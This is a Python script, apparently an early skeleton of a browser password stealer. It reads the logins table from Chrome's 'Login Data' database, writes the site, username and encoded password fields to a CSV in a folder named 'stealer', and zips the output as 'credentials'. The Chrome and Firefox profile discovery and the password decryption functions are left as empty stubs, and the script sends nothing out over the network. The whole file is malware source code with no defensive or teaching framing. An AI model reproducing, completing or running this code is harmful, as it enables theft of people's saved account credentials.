import os
from shutil import copyfile, make_archive
import sqlite3
import json
import base64

def profile_discovery():
    chrome_path = "/home/user/.config/google-chrome/Default/"
    firefox_path = "/home/user/.mozilla/firefox/"
    
    if os.path.exists(chrome_path):
        # Chrome Profile Discovery
        pass
    
    if os.path.exists(firefox_path):
        # Firefox Profile Discovery
        pass

def database_access(db_file, output_file):
    conn = sqlite3.connect(db_file)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM logins")
    
    with open(output_file, "w") as f:
        for row in cursor.fetchall():
            print(f"{row[1]},{row[2]},'{base64.b64encode(row[3]).decode()}'", file=f)

def decryption(master_key):
    pass

def packaging(credentials):
    make_archive("credentials", "zip", credentials)

def main():
    profile_discovery()
    database_access("/home/user/.config/google-chrome/Default/Login Data", "/home/user/stealer/login_data.csv")
    # Add Firefox and other browser databases as needed
    packaging("/home/user/stealer")

if __name__ == "__main__":
    main()
